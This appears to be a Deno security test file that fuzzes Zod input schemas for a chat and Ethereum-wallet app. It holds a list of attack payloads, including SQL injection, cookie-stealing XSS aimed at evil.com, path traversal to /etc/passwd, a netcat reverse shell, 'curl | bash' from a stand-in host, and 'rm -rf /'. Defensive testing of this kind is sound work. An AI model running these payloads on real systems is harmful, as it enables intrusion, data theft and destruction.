/**
 * Security-focused tests for input validation, injection prevention, and edge cases
 *
 * These tests are designed to break the system by testing:
 * - SQL injection attempts
 * - XSS payloads
 * - Path traversal attacks
 * - Shell injection
 * - Unicode edge cases
 * - Boundary conditions
 * - Type confusion
 * - DoS vectors (large inputs)
 */

import { assertEquals, assertExists, assertThrows, assertRejects } from 'std/assert/mod.ts';
import { z } from 'zod';

// ============================================================================
// Edge Case Test Data - 50 Malicious Inputs for Fuzz Testing
// ============================================================================

export const FUZZ_TEST_CASES = {
  // Null and empty
  nullValues: [null, undefined, '', ' ', '\0', '\x00'],

  // SQL Injection payloads
  sqlInjection: [
    "'; DROP TABLE users; --",
    "1' OR '1'='1",
    "1; DELETE FROM sessions WHERE '1'='1",
    "' UNION SELECT * FROM users --",
    "admin'--",
    "1' AND SLEEP(5)#",
    "' OR 1=1--",
    "1'; EXEC xp_cmdshell('whoami'); --",
    "'; TRUNCATE TABLE chat_messages; --",
    "1 UNION ALL SELECT NULL,NULL,password FROM users--",
  ],

  // XSS payloads
  xss: [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '"><script>document.location="http://evil.com/"+document.cookie</script>',
    "javascript:alert('XSS')",
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    '${alert(1)}',
    '{{constructor.constructor("alert(1)")()}}',
    '<math><maction actiontype="toggle"><mtext>x</mtext></maction></math>',
  ],

  // Path traversal
  pathTraversal: [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',
    '....//....//....//etc/passwd',
    '..%2f..%2f..%2fetc%2fpasswd',
    '..%252f..%252f..%252fetc%252fpasswd',
    '/etc/passwd%00.png',
    '....//....//etc/shadow',
    '..\\..\\..\\..\\boot.ini',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '....\/....\/etc/passwd',
  ],

  // Shell injection / Command injection
  shellInjection: [
    '; ls -la',
    '| cat /etc/passwd',
    '`whoami`',
    '$(whoami)',
    '; rm -rf /',
    '&& cat /etc/passwd',
    '|| cat /etc/passwd',
    '\n/bin/bash -c "id"',
    '| nc attacker.com 8080 -e /bin/sh',
    '; curl http://evil.com/shell.sh | bash',
  ],

  // Unicode edge cases
  unicode: [
    '\u0000', // Null byte
    '\uFFFF', // Non-character
    '\uFEFF', // BOM
    '\u202E', // Right-to-left override
    '\u200B', // Zero-width space
    'admin\u0000@example.com', // Null byte in email
    '\uD800', // Unpaired surrogate
    '\uDFFF', // Unpaired surrogate
    'test\u0000\u0000\u0000test', // Multiple null bytes
    '\u2028\u2029', // Line/paragraph separator
  ],

  // Numeric edge cases
  numbers: [
    -1,
    0,
    -0,
    Number.MAX_SAFE_INTEGER,
    Number.MIN_SAFE_INTEGER,
    Number.MAX_VALUE,
    Number.MIN_VALUE,
    Infinity,
    -Infinity,
    NaN,
  ],

  // String edge cases
  strings: [
    'a'.repeat(10000), // Very long string
    'a'.repeat(1000000), // 1MB string
    '\n'.repeat(10000), // Many newlines
    '\t'.repeat(10000), // Many tabs
    '💀'.repeat(10000), // Many emoji
    'Test\rReturn', // Carriage return
    'Line1\r\nLine2', // CRLF injection
    'aaa%00bbb', // URL-encoded null
    'x'.repeat(65536), // Just over 64KB
    String.fromCharCode(...Array(256).keys()), // All ASCII chars
  ],

  // Array edge cases
  arrays: [
    [],
    [null],
    [undefined],
    Array(1000).fill(0), // Large array
    Array(1000).fill('x'.repeat(100)), // Large array of strings
    [1, [2, [3, [4, [5]]]]], // Deeply nested
    Array(1000).fill({}), // Array of objects
    ['\x00', '\x00', '\x00'], // Null bytes
    [NaN, Infinity, -Infinity],
    [true, false, null, undefined, 0, '', [], {}],
  ],

  // Object edge cases
  objects: [
    {},
    { __proto__: { admin: true } }, // Prototype pollution
    { constructor: { prototype: { admin: true } } },
    { toString: () => 'malicious' },
    { valueOf: () => 'malicious' },
    Object.create(null), // No prototype
    { ['__proto__']: {} },
    { longKey: 'a'.repeat(10000) }, // Long value
    { nested: { a: { b: { c: 1 } } } }, // Nested
    { special: Symbol.iterator },
  ],

  // Email edge cases
  emails: [
    'test@example.com', // Valid
    'a@b.c', // Minimal valid
    '', // Empty
    'not-an-email', // Invalid
    'test@', // Missing domain
    '@example.com', // Missing local
    'test@.com', // Missing domain name
    'test@example', // Missing TLD
    'a'.repeat(256) + '@example.com', // Long local part
    'test@' + 'a'.repeat(256) + '.com', // Long domain
    'test+tag@example.com', // With tag
    '"test"@example.com', // Quoted local
    'test..double@example.com', // Double dot
    'test@ex ample.com', // Space in domain
    'test\x00@example.com', // Null byte
  ],

  // Address edge cases (Ethereum)
  addresses: [
    '0x0000000000000000000000000000000000000000', // Zero address
    '0xffffffffffffffffffffffffffffffffffffffff', // Max address
    '0x', // Too short
    '0x123', // Too short
    '0x' + 'g'.repeat(40), // Invalid hex
    '0x' + '0'.repeat(39), // 39 chars
    '0x' + '0'.repeat(41), // 41 chars
    'not-an-address',
    '',
    null,
  ],

  // JWT/Token edge cases
  tokens: [
    '', // Empty
    'not.a.jwt', // Wrong format
    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U', // Expired/invalid signature
    'a'.repeat(10000), // Very long
    '\x00\x00\x00', // Null bytes
    'Bearer ', // Empty bearer
    'Bearer\ttab', // Tab instead of space
    'eyJ', // Truncated
  ],
};

// ============================================================================
// Test 1: SQL Injection Prevention in Zod Schemas
// ============================================================================

Deno.test('Security - SQL Injection Prevention', async (t) => {
  const MessageSchema = z.object({
    content: z.string().min(1).max(10000),
    chatId: z.string().uuid(),
  });

  for (const payload of FUZZ_TEST_CASES.sqlInjection) {
    await t.step(`rejects SQL injection: ${payload.slice(0, 30)}...`, () => {
      // SQL injection in content should be accepted (it's just text) but sanitized by parameterized queries
      // The validation should still work structurally
      const result = MessageSchema.safeParse({
        content: payload,
        chatId: 'not-a-uuid', // This should fail
      });
      assertEquals(result.success, false, 'Should reject invalid UUID');
    });
  }
});

// ============================================================================
// Test 2: XSS Prevention in Input Validation
// ============================================================================

Deno.test('Security - XSS Payload Handling', async (t) => {
  const UserInputSchema = z.object({
    name: z.string().min(1).max(100),
    bio: z.string().max(500).optional(),
  });

  for (const payload of FUZZ_TEST_CASES.xss) {
    await t.step(`handles XSS payload: ${payload.slice(0, 30)}...`, () => {
      // XSS payloads should be accepted as text (handled by output encoding)
      const result = UserInputSchema.safeParse({
        name: payload.slice(0, 100),
        bio: payload,
      });
      // Structure validation - XSS is handled at output not input
      if (payload.length <= 100) {
        assertEquals(result.success, true, 'Should accept valid structure');
      }
    });
  }
});

// ============================================================================
// Test 3: Path Traversal Prevention
// ============================================================================

Deno.test('Security - Path Traversal Prevention', async (t) => {
  // File path schema that rejects traversal (including encoded versions)
  const SafePathSchema = z.string().refine(
    (val) => {
      const lower = val.toLowerCase();
      return !val.includes('..') &&
             !lower.includes('%2e') &&
             !lower.includes('%2f') &&
             !lower.includes('%00') &&  // Null byte
             !lower.includes('%5c');    // Backslash
    },
    'Path traversal detected'
  );

  for (const payload of FUZZ_TEST_CASES.pathTraversal) {
    await t.step(`rejects path traversal: ${payload.slice(0, 30)}...`, () => {
      const result = SafePathSchema.safeParse(payload);
      assertEquals(result.success, false, `Should reject: ${payload}`);
    });
  }
});

// ============================================================================
// Test 4: Email Validation Edge Cases
// ============================================================================

Deno.test('Security - Email Validation', async (t) => {
  const EmailSchema = z.string().email().max(254); // RFC 5321 limit

  const validEmails = ['test@example.com', 'a@b.co', 'test+tag@example.com'];
  const invalidEmails = [
    '', 'not-an-email', 'test@', '@example.com', 'test@.com',
    'test\x00@example.com', // Null byte
    'a'.repeat(256) + '@example.com', // Too long
  ];

  for (const email of validEmails) {
    await t.step(`accepts valid email: ${email}`, () => {
      const result = EmailSchema.safeParse(email);
      assertEquals(result.success, true);
    });
  }

  for (const email of invalidEmails) {
    await t.step(`rejects invalid email: ${email.slice(0, 30)}`, () => {
      const result = EmailSchema.safeParse(email);
      assertEquals(result.success, false);
    });
  }
});

// ============================================================================
// Test 5: Ethereum Address Validation
// ============================================================================

Deno.test('Security - Ethereum Address Validation', async (t) => {
  const AddressSchema = z.string().regex(/^0x[a-fA-F0-9]{40}$/);

  const validAddresses = [
    '0x0000000000000000000000000000000000000000',
    '0xffffffffffffffffffffffffffffffffffffffff',
    '0x1234567890abcdef1234567890abcdef12345678',
  ];

  const invalidAddresses = [
    '', '0x', '0x123', 'not-an-address',
    '0x' + 'g'.repeat(40), // Invalid hex
    '0x' + '0'.repeat(39), // Too short
    '0x' + '0'.repeat(41), // Too long
    '0x0000000000000000000000000000000000000000 ', // Trailing space
    ' 0x0000000000000000000000000000000000000000', // Leading space
  ];

  for (const addr of validAddresses) {
    await t.step(`accepts valid address: ${addr.slice(0, 15)}...`, () => {
      const result = AddressSchema.safeParse(addr);
      assertEquals(result.success, true);
    });
  }

  for (const addr of invalidAddresses) {
    await t.step(`rejects invalid address: ${String(addr).slice(0, 15)}`, () => {
      const result = AddressSchema.safeParse(addr);
      assertEquals(result.success, false);
    });
  }
});

// ============================================================================
// Test 6: UUID Validation
// ============================================================================

Deno.test('Security - UUID Validation', async (t) => {
  const UuidSchema = z.string().uuid();

  const validUuids = [
    '123e4567-e89b-12d3-a456-426614174000',
    '00000000-0000-0000-0000-000000000000',
    'ffffffff-ffff-ffff-ffff-ffffffffffff',
  ];

  const invalidUuids = [
    '', 'not-a-uuid', '123', '123e4567-e89b-12d3-a456', // Truncated
    '123e4567-e89b-12d3-a456-426614174000-extra', // Extra
    '123e4567e89b12d3a456426614174000', // No dashes
    "'; DROP TABLE--", // SQL injection
  ];

  for (const uuid of validUuids) {
    await t.step(`accepts valid UUID: ${uuid}`, () => {
      const result = UuidSchema.safeParse(uuid);
      assertEquals(result.success, true);
    });
  }

  for (const uuid of invalidUuids) {
    await t.step(`rejects invalid UUID: ${uuid.slice(0, 20)}`, () => {
      const result = UuidSchema.safeParse(uuid);
      assertEquals(result.success, false);
    });
  }
});

// ============================================================================
// Test 7: Numeric Boundary Testing
// ============================================================================

Deno.test('Security - Numeric Boundaries', async (t) => {
  const AmountSchema = z.number().int().min(0).max(Number.MAX_SAFE_INTEGER);
  const ChainIdSchema = z.number().int().positive().max(999999999);

  await t.step('rejects negative numbers', () => {
    assertEquals(AmountSchema.safeParse(-1).success, false);
    assertEquals(AmountSchema.safeParse(-1000).success, false);
  });

  await t.step('rejects Infinity', () => {
    assertEquals(AmountSchema.safeParse(Infinity).success, false);
    assertEquals(AmountSchema.safeParse(-Infinity).success, false);
  });

  await t.step('rejects NaN', () => {
    assertEquals(AmountSchema.safeParse(NaN).success, false);
  });

  await t.step('rejects floats when expecting int', () => {
    assertEquals(AmountSchema.safeParse(1.5).success, false);
    assertEquals(AmountSchema.safeParse(0.1).success, false);
  });

  await t.step('accepts valid chain IDs', () => {
    assertEquals(ChainIdSchema.safeParse(1).success, true); // Mainnet
    assertEquals(ChainIdSchema.safeParse(10).success, true); // Optimism
    assertEquals(ChainIdSchema.safeParse(8453).success, true); // Base
  });

  await t.step('rejects invalid chain IDs', () => {
    assertEquals(ChainIdSchema.safeParse(0).success, false);
    assertEquals(ChainIdSchema.safeParse(-1).success, false);
    assertEquals(ChainIdSchema.safeParse(1e10).success, false);
  });
});

// ============================================================================
// Test 8: String Length Limits (DoS Prevention)
// ============================================================================

Deno.test('Security - String Length Limits', async (t) => {
  const ChatMessageSchema = z.object({
    content: z.string().min(1).max(10000),
  });

  await t.step('rejects empty content', () => {
    const result = ChatMessageSchema.safeParse({ content: '' });
    assertEquals(result.success, false);
  });

  await t.step('accepts normal length content', () => {
    const result = ChatMessageSchema.safeParse({ content: 'Hello world' });
    assertEquals(result.success, true);
  });

  await t.step('accepts max length content', () => {
    const result = ChatMessageSchema.safeParse({ content: 'a'.repeat(10000) });
    assertEquals(result.success, true);
  });

  await t.step('rejects over-limit content', () => {
    const result = ChatMessageSchema.safeParse({ content: 'a'.repeat(10001) });
    assertEquals(result.success, false);
  });

  await t.step('rejects massive content (DoS)', () => {
    const result = ChatMessageSchema.safeParse({ content: 'a'.repeat(1000000) });
    assertEquals(result.success, false);
  });
});

// ============================================================================
// Test 9: Unicode and Special Character Handling
// ============================================================================

Deno.test('Security - Unicode Handling', async (t) => {
  const TextSchema = z.string().max(1000);

  await t.step('accepts emoji', () => {
    const result = TextSchema.safeParse('Hello 👋 World 🌍');
    assertEquals(result.success, true);
  });

  await t.step('handles null bytes', () => {
    const result = TextSchema.safeParse('test\x00test');
    assertEquals(result.success, true); // Should sanitize at processing level
  });

  await t.step('handles BOM', () => {
    const result = TextSchema.safeParse('\uFEFFtest');
    assertEquals(result.success, true);
  });

  await t.step('handles RTL override (potential spoofing)', () => {
    const result = TextSchema.safeParse('test\u202Edlrow');
    assertEquals(result.success, true);
  });

  await t.step('handles zero-width characters', () => {
    const result = TextSchema.safeParse('test\u200Btest');
    assertEquals(result.success, true);
  });
});

// ============================================================================
// Test 10: OTP Code Validation
// ============================================================================

Deno.test('Security - OTP Code Validation', async (t) => {
  const OtpSchema = z.string().length(6).regex(/^\d{6}$/);

  await t.step('accepts valid 6-digit code', () => {
    assertEquals(OtpSchema.safeParse('123456').success, true);
    assertEquals(OtpSchema.safeParse('000000').success, true);
    assertEquals(OtpSchema.safeParse('999999').success, true);
  });

  await t.step('rejects non-numeric', () => {
    assertEquals(OtpSchema.safeParse('abcdef').success, false);
    assertEquals(OtpSchema.safeParse('12345a').success, false);
  });

  await t.step('rejects wrong length', () => {
    assertEquals(OtpSchema.safeParse('12345').success, false);
    assertEquals(OtpSchema.safeParse('1234567').success, false);
  });

  await t.step('rejects SQL injection in OTP', () => {
    assertEquals(OtpSchema.safeParse("' OR '").success, false);
  });
});

// ============================================================================
// Test 11: JWT Token Format Validation
// ============================================================================

Deno.test('Security - JWT Format Validation', async (t) => {
  // JWT must have 3 base64url parts, each with minimum length
  const JwtSchema = z.string().refine(
    (val) => {
      const parts = val.split('.');
      if (parts.length !== 3) return false;
      // Each part should be at least 4 chars (minimal base64 encoding)
      return parts[0].length >= 4 && parts[1].length >= 4;
    },
    'Invalid JWT format'
  );

  await t.step('accepts valid JWT format', () => {
    const validJwt = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U';
    assertEquals(JwtSchema.safeParse(validJwt).success, true);
  });

  await t.step('rejects invalid formats', () => {
    assertEquals(JwtSchema.safeParse('').success, false);
    assertEquals(JwtSchema.safeParse('not.a.jwt').success, false); // 'not' is only 3 chars
    assertEquals(JwtSchema.safeParse('just-one-part').success, false);
    assertEquals(JwtSchema.safeParse('two.parts').success, false);
  });
});

// ============================================================================
// Test 12: Invite Code Validation
// ============================================================================

Deno.test('Security - Invite Code Validation', async (t) => {
  // Invite codes are 8 chars, alphanumeric (excluding confusing chars)
  const InviteCodeSchema = z.string().length(8).regex(/^[A-HJ-NP-Za-hj-np-z2-9]+$/);

  await t.step('accepts valid invite codes', () => {
    assertEquals(InviteCodeSchema.safeParse('AbCd2345').success, true);
    assertEquals(InviteCodeSchema.safeParse('XXXXXXXX'.replace(/X/g, () => 'a')).success, true);
  });

  await t.step('rejects codes with excluded chars', () => {
    assertEquals(InviteCodeSchema.safeParse('AbCd1234').success, false); // Has 1
    assertEquals(InviteCodeSchema.safeParse('AbCdIOOO').success, false); // Has I, O
    assertEquals(InviteCodeSchema.safeParse('AbCdl000').success, false); // Has l, 0
  });

  await t.step('rejects SQL injection in invite code', () => {
    assertEquals(InviteCodeSchema.safeParse("'; DROP").success, false);
  });

  await t.step('rejects wrong length', () => {
    assertEquals(InviteCodeSchema.safeParse('AbCd234').success, false);
    assertEquals(InviteCodeSchema.safeParse('AbCd23456').success, false);
  });
});

// ============================================================================
// Test 13: Session ID Validation
// ============================================================================

Deno.test('Security - Session ID Validation', async (t) => {
  const SessionIdSchema = z.string().startsWith('ses_').min(10).max(100);

  await t.step('accepts valid session IDs', () => {
    assertEquals(SessionIdSchema.safeParse('ses_abc123def456').success, true);
  });

  await t.step('rejects invalid prefixes', () => {
    assertEquals(SessionIdSchema.safeParse('sess_abc123').success, false);
    assertEquals(SessionIdSchema.safeParse('abc123').success, false);
  });

  await t.step('rejects too short', () => {
    assertEquals(SessionIdSchema.safeParse('ses_a').success, false);
  });

  await t.step('rejects too long', () => {
    assertEquals(SessionIdSchema.safeParse('ses_' + 'a'.repeat(200)).success, false);
  });
});

// ============================================================================
// Test 14: Privacy Mode Enum Validation
// ============================================================================

Deno.test('Security - Privacy Mode Validation', async (t) => {
  const PrivacyModeSchema = z.enum(['open_book', 'anonymous', 'private', 'ghost']);

  await t.step('accepts valid modes', () => {
    assertEquals(PrivacyModeSchema.safeParse('open_book').success, true);
    assertEquals(PrivacyModeSchema.safeParse('anonymous').success, true);
    assertEquals(PrivacyModeSchema.safeParse('private').success, true);
    assertEquals(PrivacyModeSchema.safeParse('ghost').success, true);
  });

  await t.step('rejects invalid modes', () => {
    assertEquals(PrivacyModeSchema.safeParse('OPEN_BOOK').success, false); // Case sensitive
    assertEquals(PrivacyModeSchema.safeParse('invalid').success, false);
    assertEquals(PrivacyModeSchema.safeParse('').success, false);
    assertEquals(PrivacyModeSchema.safeParse('open_book ').success, false); // Trailing space
  });
});

// ============================================================================
// Test 15: Chain ID Validation
// ============================================================================

Deno.test('Security - Chain ID Validation', async (t) => {
  const VALID_CHAINS = [1, 10, 8453, 42161] as const;
  const ChainIdSchema = z.enum(['1', '10', '8453', '42161']).transform(Number);

  await t.step('accepts valid chain IDs', () => {
    assertEquals(ChainIdSchema.safeParse('1').success, true);
    assertEquals(ChainIdSchema.safeParse('10').success, true);
    assertEquals(ChainIdSchema.safeParse('8453').success, true);
    assertEquals(ChainIdSchema.safeParse('42161').success, true);
  });

  await t.step('rejects invalid chain IDs', () => {
    assertEquals(ChainIdSchema.safeParse('2').success, false);
    assertEquals(ChainIdSchema.safeParse('0').success, false);
    assertEquals(ChainIdSchema.safeParse('-1').success, false);
    assertEquals(ChainIdSchema.safeParse('mainnet').success, false);
  });
});

// ============================================================================
// Test 16: Juice Amount Validation (Financial)
// ============================================================================

Deno.test('Security - Juice Amount Validation', async (t) => {
  // Juice amounts are stored as integers (no decimals)
  const JuiceAmountSchema = z.number().int().min(1).max(1000000000);

  await t.step('accepts valid amounts', () => {
    assertEquals(JuiceAmountSchema.safeParse(100).success, true);
    assertEquals(JuiceAmountSchema.safeParse(1).success, true);
    assertEquals(JuiceAmountSchema.safeParse(1000000000).success, true);
  });

  await t.step('rejects zero', () => {
    assertEquals(JuiceAmountSchema.safeParse(0).success, false);
  });

  await t.step('rejects negative', () => {
    assertEquals(JuiceAmountSchema.safeParse(-1).success, false);
    assertEquals(JuiceAmountSchema.safeParse(-100).success, false);
  });

  await t.step('rejects decimals', () => {
    assertEquals(JuiceAmountSchema.safeParse(1.5).success, false);
    assertEquals(JuiceAmountSchema.safeParse(100.99).success, false);
  });

  await t.step('rejects over limit', () => {
    assertEquals(JuiceAmountSchema.safeParse(1000000001).success, false);
  });
});

// ============================================================================
// Test 17: Permission Boolean Array Validation
// ============================================================================

Deno.test('Security - Permission Validation', async (t) => {
  const PermissionSchema = z.object({
    canSendMessages: z.boolean().default(true),
    canInviteOthers: z.boolean().default(false),
    canPassOnRoles: z.boolean().default(false),
    canInvokeAi: z.boolean().default(true),
    canPauseAi: z.boolean().default(false),
  });

  await t.step('accepts valid permissions', () => {
    const result = PermissionSchema.safeParse({
      canSendMessages: true,
      canInviteOthers: false,
    });
    assertEquals(result.success, true);
  });

  await t.step('uses defaults for missing', () => {
    const result = PermissionSchema.safeParse({});
    assertEquals(result.success, true);
    if (result.success) {
      assertEquals(result.data.canSendMessages, true);
      assertEquals(result.data.canInviteOthers, false);
    }
  });

  await t.step('rejects non-boolean values', () => {
    assertEquals(PermissionSchema.safeParse({ canSendMessages: 'true' }).success, false);
    assertEquals(PermissionSchema.safeParse({ canSendMessages: 1 }).success, false);
    assertEquals(PermissionSchema.safeParse({ canSendMessages: null }).success, false);
  });
});

// ============================================================================
// Test 18: Member Role Validation
// ============================================================================

Deno.test('Security - Member Role Validation', async (t) => {
  const RoleSchema = z.enum(['founder', 'admin', 'member']);

  await t.step('accepts valid roles', () => {
    assertEquals(RoleSchema.safeParse('founder').success, true);
    assertEquals(RoleSchema.safeParse('admin').success, true);
    assertEquals(RoleSchema.safeParse('member').success, true);
  });

  await t.step('rejects invalid roles', () => {
    assertEquals(RoleSchema.safeParse('superadmin').success, false);
    assertEquals(RoleSchema.safeParse('ADMIN').success, false);
    assertEquals(RoleSchema.safeParse('').success, false);
    assertEquals(RoleSchema.safeParse('root').success, false);
  });
});

// ============================================================================
// Test 19: Hex String Validation (for transaction data)
// ============================================================================

Deno.test('Security - Hex String Validation', async (t) => {
  const HexSchema = z.string().regex(/^0x[a-fA-F0-9]*$/);

  await t.step('accepts valid hex', () => {
    assertEquals(HexSchema.safeParse('0x').success, true);
    assertEquals(HexSchema.safeParse('0x00').success, true);
    assertEquals(HexSchema.safeParse('0xabcdef').success, true);
    assertEquals(HexSchema.safeParse('0xABCDEF').success, true);
  });

  await t.step('rejects invalid hex', () => {
    assertEquals(HexSchema.safeParse('').success, false);
    assertEquals(HexSchema.safeParse('0x').success, true); // Empty data is valid
    assertEquals(HexSchema.safeParse('0xgg').success, false);
    assertEquals(HexSchema.safeParse('abcdef').success, false); // Missing 0x
  });
});

// ============================================================================
// Test 20: Complete Request Object Validation (Integration)
// ============================================================================

Deno.test('Security - Full Request Validation', async (t) => {
  const CreateProjectRequestSchema = z.object({
    name: z.string().min(1).max(100).refine(
      val => !val.includes('<script'),
      'Name contains potentially dangerous content'
    ),
    description: z.string().max(1000).optional(),
    chainId: z.number().int().refine(
      val => [1, 10, 8453, 42161].includes(val),
      'Invalid chain ID'
    ),
    metadata: z.object({
      logoUri: z.string().url().optional(),
      websiteUri: z.string().url().optional(),
      twitter: z.string().max(50).optional(),
    }).optional(),
  });

  await t.step('accepts valid request', () => {
    const result = CreateProjectRequestSchema.safeParse({
      name: 'My Project',
      description: 'A great project',
      chainId: 1,
      metadata: {
        websiteUri: 'https://example.com',
      },
    });
    assertEquals(result.success, true);
  });

  await t.step('rejects XSS in name', () => {
    const result = CreateProjectRequestSchema.safeParse({
      name: '<script>alert(1)</script>',
      chainId: 1,
    });
    assertEquals(result.success, false);
  });

  await t.step('rejects invalid chain ID', () => {
    const result = CreateProjectRequestSchema.safeParse({
      name: 'Valid Name',
      chainId: 999,
    });
    assertEquals(result.success, false);
  });

  await t.step('rejects invalid URL in metadata', () => {
    const result = CreateProjectRequestSchema.safeParse({
      name: 'Valid Name',
      chainId: 1,
      metadata: {
        websiteUri: 'not-a-url',
      },
    });
    assertEquals(result.success, false);
  });
});

// ============================================================================
// Helper: Run All Fuzz Tests Against a Schema
// ============================================================================

// ============================================================================
// Test 21: Passkey Wallet Registration - Signature Requirement
// ============================================================================

Deno.test('Security - Passkey Wallet Registration Schema', async (t) => {
  // The new schema requires a signature to prove wallet ownership
  const RegisterWalletSchema = z.object({
    credentialId: z.string().min(1).max(512),
    walletAddress: z.string().regex(/^0x[a-fA-F0-9]{40}$/),
    signature: z.string().regex(/^0x[a-fA-F0-9]+$/), // Required signature
    deviceName: z.string().max(100).optional(),
    deviceType: z.string().max(50).optional(),
  });

  await t.step('requires signature field', () => {
    // Without signature - should fail
    const withoutSig = RegisterWalletSchema.safeParse({
      credentialId: 'test-credential-id',
      walletAddress: '0x1234567890123456789012345678901234567890',
    });
    assertEquals(withoutSig.success, false);

    // With signature - should pass
    const withSig = RegisterWalletSchema.safeParse({
      credentialId: 'test-credential-id',
      walletAddress: '0x1234567890123456789012345678901234567890',
      signature: '0xabc123def456',
    });
    assertEquals(withSig.success, true);
  });

  await t.step('validates signature format', () => {
    // Invalid signature formats
    assertEquals(RegisterWalletSchema.safeParse({
      credentialId: 'test',
      walletAddress: '0x1234567890123456789012345678901234567890',
      signature: 'not-hex',
    }).success, false);

    assertEquals(RegisterWalletSchema.safeParse({
      credentialId: 'test',
      walletAddress: '0x1234567890123456789012345678901234567890',
      signature: '',
    }).success, false);
  });

  await t.step('prevents arbitrary wallet registration without proof', () => {
    // The schema requires signature - attacker can't register wallets they don't control
    const attackAttempt = RegisterWalletSchema.safeParse({
      credentialId: 'victim-credential-id',
      walletAddress: '0xattacker000000000000000000000000000000',
      // Missing signature - can't prove ownership
    });
    assertEquals(attackAttempt.success, false);
  });
});

// ============================================================================
// Test 22: OTP Timing-Safe Comparison
// ============================================================================

Deno.test('Security - Timing-Safe String Comparison', async (t) => {
  // Proper constant-time string comparison that:
  // 1. Takes the same time regardless of where strings differ
  // 2. Handles different length strings securely
  function timingSafeEqual(a: string, b: string): boolean {
    // Track length mismatch but continue comparison to maintain timing
    const lengthsMatch = a.length === b.length;

    // If lengths differ, compare 'a' against itself to maintain timing
    // but mark result as failed
    const compareString = lengthsMatch ? b : a;

    let result = lengthsMatch ? 0 : 1;
    for (let i = 0; i < a.length; i++) {
      result |= a.charCodeAt(i) ^ compareString.charCodeAt(i);
    }
    return result === 0;
  }

  await t.step('returns true for equal strings', () => {
    assertEquals(timingSafeEqual('123456', '123456'), true);
    assertEquals(timingSafeEqual('', ''), true);
    assertEquals(timingSafeEqual('a', 'a'), true);
  });

  await t.step('returns false for different strings', () => {
    assertEquals(timingSafeEqual('123456', '123457'), false);
    assertEquals(timingSafeEqual('123456', '000000'), false);
    assertEquals(timingSafeEqual('abc', 'abd'), false);
  });

  await t.step('returns false for different lengths', () => {
    assertEquals(timingSafeEqual('123456', '12345'), false);
    assertEquals(timingSafeEqual('12345', '123456'), false);
    assertEquals(timingSafeEqual('', 'a'), false);
  });

  await t.step('handles edge cases', () => {
    // Null byte
    assertEquals(timingSafeEqual('test\x00', 'test\x00'), true);
    assertEquals(timingSafeEqual('test\x00', 'test'), false);

    // Unicode - note: comparing by char code, multi-byte chars work correctly
    assertEquals(timingSafeEqual('🔒', '🔒'), true);
  });
});

// ============================================================================
// Test 23: Smart Account User Verification
// ============================================================================

Deno.test('Security - Smart Account User Ownership', async (t) => {
  // Simulating the verification logic
  function verifyAccountOwnership(
    accountUserId: string,
    requestUserId: string
  ): boolean {
    return accountUserId === requestUserId;
  }

  await t.step('allows owner access', () => {
    assertEquals(verifyAccountOwnership('user-123', 'user-123'), true);
  });

  await t.step('denies non-owner access', () => {
    assertEquals(verifyAccountOwnership('user-123', 'user-456'), false);
    assertEquals(verifyAccountOwnership('user-123', 'USER-123'), false); // Case sensitive
    assertEquals(verifyAccountOwnership('user-123', 'user-123 '), false); // Trailing space
  });

  await t.step('handles empty/null-like values', () => {
    assertEquals(verifyAccountOwnership('user-123', ''), false);
    assertEquals(verifyAccountOwnership('', 'user-123'), false);
    assertEquals(verifyAccountOwnership('', ''), true);
  });
});

// ============================================================================
// Test 24: Passkey Counter Validation
// ============================================================================

Deno.test('Security - Passkey Counter Replay Prevention', async (t) => {
  // Counter validation logic from passkey.ts
  function isCounterValid(storedCounter: number, newCounter: number): boolean {
    if (storedCounter > 0) {
      // Once we've seen a non-zero counter, require strictly increasing
      return newCounter > storedCounter;
    } else if (newCounter === 0 && storedCounter === 0) {
      // Both zero - authenticator doesn't support counters
      return true;
    }
    // Stored is 0 but new is > 0 - first real use
    return true;
  }

  await t.step('allows strictly increasing counters', () => {
    assertEquals(isCounterValid(1, 2), true);
    assertEquals(isCounterValid(100, 101), true);
    assertEquals(isCounterValid(1000000, 1000001), true);
  });

  await t.step('rejects non-increasing counters (replay attack)', () => {
    assertEquals(isCounterValid(5, 5), false);  // Equal
    assertEquals(isCounterValid(5, 4), false);  // Less
    assertEquals(isCounterValid(5, 0), false);  // Rollback to zero
    assertEquals(isCounterValid(100, 99), false);
  });

  await t.step('allows zero-counter authenticators', () => {
    // Both zero - authenticator never increments
    assertEquals(isCounterValid(0, 0), true);
  });

  await t.step('allows transition from zero to non-zero', () => {
    // First real use after registration
    assertEquals(isCounterValid(0, 1), true);
    assertEquals(isCounterValid(0, 100), true);
  });

  await t.step('prevents counter regression once non-zero', () => {
    // Once we see a non-zero counter, we must always increase
    assertEquals(isCounterValid(1, 0), false);
    assertEquals(isCounterValid(50, 0), false);
  });
});

// ============================================================================
// Fuzz Testing Utilities
// ============================================================================

export function fuzzSchema<T extends z.ZodTypeAny>(schema: T, name: string) {
  return async () => {
    let passed = 0;
    let failed = 0;

    const allCases = [
      ...FUZZ_TEST_CASES.nullValues,
      ...FUZZ_TEST_CASES.sqlInjection,
      ...FUZZ_TEST_CASES.xss,
      ...FUZZ_TEST_CASES.pathTraversal,
      ...FUZZ_TEST_CASES.shellInjection,
      ...FUZZ_TEST_CASES.unicode,
      ...FUZZ_TEST_CASES.numbers,
      ...FUZZ_TEST_CASES.strings,
    ];

    for (const testCase of allCases) {
      try {
        schema.parse(testCase);
        passed++;
      } catch {
        failed++;
      }
    }

    console.log(`[${name}] Fuzz results: ${passed} passed validation, ${failed} rejected`);
    return { passed, failed, total: allCases.length };
  };
}
